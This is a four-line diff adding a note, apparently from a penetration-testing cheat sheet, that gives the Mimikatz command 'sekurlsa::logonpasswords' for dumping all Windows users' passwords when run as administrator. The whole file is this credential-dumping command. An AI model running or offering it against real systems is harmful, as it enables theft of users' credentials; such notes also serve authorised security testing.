@@ -1,0 +1,4 @@
+Get all windows users passwords (need to be executed as admin)
+
+sekurlsa::logonpasswords
+
